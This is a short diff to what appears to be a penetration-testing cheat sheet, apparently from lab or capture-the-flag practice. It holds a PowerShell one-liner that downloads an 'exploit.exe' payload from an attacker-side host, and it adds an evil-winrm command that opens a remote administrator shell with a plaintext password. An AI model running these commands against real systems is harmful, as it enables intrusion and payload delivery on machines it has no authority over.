@@ -1,3 +1,10 @@
 File transfer with powershell:
 
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.1.2/exploit.exe', 'exploit.exe')
+
+***************************************************************************************************************************
+
+Command to login with WinRM service:
+
+evil-winrm -u administrator -p !R3m0te! -i 10.129.77.180
+
